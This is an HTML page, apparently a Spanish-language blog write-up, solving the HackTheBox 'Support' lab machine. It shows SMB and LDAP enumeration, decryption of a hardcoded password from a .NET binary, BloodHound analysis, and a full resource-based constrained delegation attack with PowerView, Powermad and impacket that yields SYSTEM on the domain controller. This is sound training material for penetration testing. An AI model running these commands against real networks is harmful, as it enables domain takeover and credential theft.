@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Support</title>
+
+  <meta name="description" content="Resolución de la máquina Support de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Support">
+  <meta name="twitter:description" content="Resolución de la máquina Support de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/support.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Support">
+  <meta property="og:description" content="Resolución de la máquina Support de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/support.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/support.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Support" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-support">Shell - support</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/support.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Support</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap donde encontramos varios puertos abiertos, en Windows es recomendable usar el parametro <code class="language-plaintext highlighter-rouge">-Pn</code> para forzar el escaneo aunque no reciba respuesta de los paquetes ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.174 -Pn
+Nmap scan report for 10.10.11.174  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl  
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con crackmapexec a nivel de smb podemos que esta corriendo un Windows 10 ver el nombre de la máquina DC y el dominio <code class="language-plaintext highlighter-rouge">support.htb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.174
+</span><span class="az">SMB         </span><span class="p">10.10.11.174  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para que sepa a donde resolver agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts/</code> la ip con el dominio <code class="language-plaintext highlighter-rouge">support.htb</code> pero tambien <code class="language-plaintext highlighter-rouge">dc.support.htb</code> para posibles ataques futuros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.174 support.htb dc.support.htb" </span><span class="p">|</span><span class="ve"> sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando recursos compartidos de smb encontramos uno llamado <code class="language-plaintext highlighter-rouge">support-tools</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N -L support.htb
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	support-tools   Disk      support staff tools  
+	SYSVOL          Disk      Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos al recurso podemos encotrar varios archivos, varios de ellos parecen programas comunes como wireshark, 7z y tal, aunque hay uno bastante fuera de lo común <code class="language-plaintext highlighter-rouge">UserInfo.exe.zip</code> asi que lo descargamos para ver su contenido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient </span><span class="p">-N //support.htb/support-tools
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jul 20 12:01:06 2022
+  ..                                  D        0  Sat May 28 06:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022
+
+		4026367 blocks of size 4096. 969243 blocks available
+smb: \> get UserInfo.exe.zip
+getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (206.9 KiloBytes/sec) (average 206.9 KiloBytes/sec)  
+smb: \></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al listar los recursos dentro del zip sin descomprimirlo encontramos varios archivos con extensión dll y config, además de un archivo llamado <code class="language-plaintext highlighter-rouge">UserInfo.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ 7z </span><span class="p">l UserInfo.exe.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+
+Scanning the drive for archives:
+1 file, 277499 bytes (271 KiB)
+
+Listing archive: UserInfo.exe.zip
+
+--
+Path = UserInfo.exe.zip
+Type = zip
+Physical Size = 277499
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
+2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
+2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
+2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll  
+2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
+2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
+2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
+2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
+2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
+2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
+2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
+2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
+------------------- ----- ------------ ------------  ------------------------
+2022-05-27 11:51:05             652675       274861  12 files</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-support">
+<br><h3 class="post-title">Shell - support</h3><br>
+
+<p class="plain-text">Como lo que hay dentro del archivo zip es un proyecto con archivos exe y dll pasaremos el zip a una maquina Windows y lo descomprimimos</p>
+<a href="/htb/support/1.png" target="_blank"><div><p><img src="/htb/support/1.png"></p></div></a>
+
+<p class="plain-text">Usando <a href="https://github.com/dnSpy/dnSpy">dnspy</a> podemos debuguear el archivo exe donde podemos ver un apartado <code class="language-plaintext highlighter-rouge">LdapQuery</code> que define una string password igualada al resultado de la función <code class="language-plaintext highlighter-rouge">getPassword</code> del apartado Protected y con ella se autentica al servidor ldap</p>
+<a href="/htb/support/2.png" target="_blank"><div><p><img src="/htb/support/2.png"></p></div></a>
+
+<p class="plain-text">En el apartado <code class="language-plaintext highlighter-rouge">Protected</code> podemos ver una función que llama a 2 variables: la contraseña encriptada y la key (ambas definidas abajo), para despues realizar una operación para obtener la contraseña en texto claro</p>
+<a href="/htb/support/3.png" target="_blank"><div><p><img src="/htb/support/3.png"></p></div></a>
+
+<p class="plain-text">En python podemos crear un script donde definimos ambas variables y realizamos la operación que hace la función <code class="language-plaintext highlighter-rouge">getPassword</code> en el archivo exe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">import</span> <span class="p">base64</span>
+
+<span class="p">enc_password</span> <span class="o">=</span> <span class="k">b</span><span class="s">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>  
+<span class="p">key</span> <span class="o">=</span> <span class="k">b</span><span class="s">"armando"</span>
+
+<span class="p">array</span> <span class="o">=</span> <span class="p">base64</span><span class="p">.</span><span class="p">b64decode</span><span class="p">(</span><span class="p">enc_password</span><span class="p">)</span>
+<span class="p">array2</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="kn">for</span> <span class="p">i</span> <span class="ow">in</span> <span class="k">range</span><span class="p">(</span><span class="k">len</span><span class="p">(</span><span class="p">array</span><span class="p">)):</span>
+    <span class="p">array2</span><span class="p">.</span><span class="p">append</span><span class="p">(</span><span class="k">chr</span><span class="p">(</span><span class="p">array</span><span class="p">[</span><span class="p">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">key</span><span class="p">[</span><span class="p">i</span> <span class="o">%</span> <span class="k">len</span><span class="p">(</span><span class="p">key</span><span class="p">)]</span> <span class="o">^</span> <span class="mi">223</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="p">join</span><span class="p">(</span><span class="p">array2</span><span class="p">))</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo obtenemos una contraseña posiblemente valida para el servicio ldap</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">getPassword.py
+nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobarlo con crackmapexec hacia ldap son válidas para el usuario ldap</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap 10.10.11.174 -u ldap -p </span><span class="am">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">10.10.11.174  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">LDAP        </span><span class="p">10.10.11.174  389    DC               </span><span class="ve">[+] </span><span class="p">support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de un rato filtrando datos con <code class="language-plaintext highlighter-rouge">ldapsearch</code> podemos encontrar entre la información de los usuarios un campo info que tiene lo que parece ser una contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ldapsearch</span><span class="p"> -H ldap://support.htb -D </span><span class="am">'support\ldap'</span><span class="p"> -w </span><span class="am">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span><span class="p"> -b </span><span class="am">'CN=Users,DC=support,DC=htb'</span><span class="p"> | </span><span class="ve">grep </span><span class="p">info:  
+info: Ironside47pleasure40Watchful</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para recolectar información del dominio usaremos <code class="language-plaintext highlighter-rouge">bloodhound-python</code> pasandole las credenciales ldap, esto nos generara varios archivos json con la información</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u ldap -p </span><span class="am">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span><span class="p"> -c All -d support.htb -ns 10.10.11.174  
+INFO: Found AD domain: support.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc.support.htb
+INFO: Found 21 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: Management.support.htb
+INFO: Querying computer: dc.support.htb
+INFO: Done in 00M 31S</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de subir los archivos json, podemos ver que el usuario <code class="language-plaintext highlighter-rouge">support</code> es el unico miembro del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> por lo que se puede conectar a winrm</p>
+<a href="/htb/support/4.png" target="_blank"><div><p><img src="/htb/support/4.png"></p></div></a>
+
+<p class="plain-text">Podemos probar las contraseña a nivel de winrm con el usuario support y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> lo que significa que es válida y podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm 10.10.11.174 -u support -p Ironside47pleasure40Watchful
+</span><span class="az">SMB         </span><span class="p">10.10.11.174  5985   DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
+</span><span class="az">HTTP        </span><span class="p">10.10.11.174  5985   DC               </span><span class="az">[*] </span><span class="p">http://10.10.11.174/wsman
+</span><span class="az">WINRM       </span><span class="p">10.10.11.174  5985   DC               </span><span class="ve">[+] </span><span class="p">support.htb\support:Ironside47pleasure40Watchful </span><span class="am">(Pwn3d!)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con evil-winrm y obtenemos una shell como el usuario <code class="language-plaintext highlighter-rouge">support</code>, ahora podemos leer la primera flag que se encuentra en es escritorio del usuario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i support.htb -u support -p Ironside47pleasure40Watchful  
+
+PS C:\Users\support\Documents> </span><span class="am">whoami</span><span class="p">
+support\support
+PS C:\Users\support\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+99b**************************149
+PS C:\Users\support\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Volviendo a bloodhound, listando los grupos del usuario support que ahora tenemos pwneado podemos ver otro grupo del que forma parte <code class="language-plaintext highlighter-rouge">Shared Support Accounts</code></p>
+<a href="/htb/support/5.png" target="_blank"><div><p><img src="/htb/support/5.png"></p></div></a>
+
+<p class="plain-text">En el apartado <code class="language-plaintext highlighter-rouge">Group Delegated Object Control</code> del usuario support podemos ver que el usuario support forma parte del grupo <code class="language-plaintext highlighter-rouge">Shared Support Accounts</code> y este a su vez tiene como permisos <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el equipo <code class="language-plaintext highlighter-rouge">dc.support.htb</code></p>
+<a href="/htb/support/6.png" target="_blank"><div><p><img src="/htb/support/6.png"></p></div></a>
+
+<p class="plain-text">Si damos clic derecho y hacemos clic en <code class="language-plaintext highlighter-rouge">Help</code> en el apartado <code class="language-plaintext highlighter-rouge">Abuse Info</code> se nos proporciona la explicación y los comandos base para explotar este privilegio</p>
+<a href="/htb/support/7.png" target="_blank"><div><p><img src="/htb/support/7.png"></p></div></a>
+
+<p class="plain-text">Para explotar este privilegios necesitamos comandos especiales asi que subimos los módulos <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> y <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a>, en este caso para subirlos podemos aprovechar la función <code class="language-plaintext highlighter-rouge">upload</code> que nos ofrece evil-winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\support\Documents> </span><span class="am">upload </span><span class="p">PowerView.ps1
+</span><span class="az">
+Info: Uploading PowerView.ps1 to C:\Users\support\Documents\PowerView.ps1  
+</span><span class="mi">
+Data: 1027036 bytes of 1027036 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\support\Documents> </span><span class="am">upload </span><span class="p">Powermad.ps1
+</span><span class="az">
+Info: Uploading Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1
+                      </span><span class="mi"> 
+Data: 180768 bytes of 180768 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\support\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora para tener acceso a sus funciones los importamos con <code class="language-plaintext highlighter-rouge">Import-Module</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\support\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1  
+PS C:\Users\support\Documents> </span><span class="am">Import-Module</span><span class="p"> .\Powermad.ps1
+PS C:\Users\support\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplemente seguiremos los pasos que nos indica bloodhound usando los comandos que nos proporciona, iniciamos creando una nueva cuenta de máquina<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\support\Documents> </span><span class="am">New-MachineAccount </span><span class="c1">-MachineAccount </span><span class="p">attackersystem </span><span class="c1">-Password </span><span class="p">$(</span><span class="am">ConvertTo-SecureString </span><span class="az">'123456' </span><span class="c1">-AsPlainText -Force</span><span class="p">)  
+[+] Machine account attackersystem added
+PS C:\Users\support\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya creada seguimos ejecutando los comandos que nos proporciona bloodhound<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\support\Documents> </span><span class="ve">$ComputerSid </span><span class="c1">= </span><span class="am">Get-DomainComputer </span><span class="p">attackersystem </span><span class="c1">-Properties </span><span class="p">objectsid | </span><span class="am">Select </span><span class="c1">-Expand </span><span class="p">objectsid
+PS C:\Users\support\Documents> </span><span class="ve">$SD </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">Security.AccessControl.RawSecurityDescriptor </span><span class="c1">-ArgumentList </span><span class="az">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="ve">$ComputerSid</span><span class="p">)</span><span class="az">)"</span><span class="p">  
+PS C:\Users\support\Documents> </span><span class="ve">$SDBytes </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">byte[] (</span><span class="ve">$SD</span><span class="p">.BinaryLength)
+PS C:\Users\support\Documents> </span><span class="ve">$SD</span><span class="p">.GetBinaryForm(</span><span class="ve">$SDBytes</span><span class="p">, 0)
+PS C:\Users\support\Documents> </span><span class="am">Get-DomainComputer </span><span class="p">DC | </span><span class="am">Set-DomainObject</span><span class="c1"> -Set </span><span class="p">@{</span><span class="az">'msds-allowedtoactonbehalfofotheridentity'</span><span class="c1">=</span><span class="ve">$SDBytes</span><span class="p">}
+PS C:\Users\support\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este punto bloodhound nos dice que usemos <code class="language-plaintext highlighter-rouge">Rubeus</code>, en este caso usaremos las herramientas de <code class="language-plaintext highlighter-rouge">impacket</code>, asi que iniciamos obteniendo un ticket impersonando a <code class="language-plaintext highlighter-rouge">Administrator</code> usando la cuenta con las credenciales que hemos creado antes<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getST </span><span class="p">support.htb/attackersystem:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb  
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez guardado exportamos la variable <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> con el nombre del ticket y usamos <code class="language-plaintext highlighter-rouge">psexec</code> para conseguir una cmd como Administrator, podemos leer flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ export </span><span class="p">KRB5CCNAME=administrator.ccache
+
+</span><span class="ve">❯ impacket-psexec </span><span class="p">support.htb/administrator@dc.support.htb -no-pass -k  
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file uUiWMRnR.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service ltUm on dc.support.htb.....
+[*] Starting service ltUm.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+dc2**************************977
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
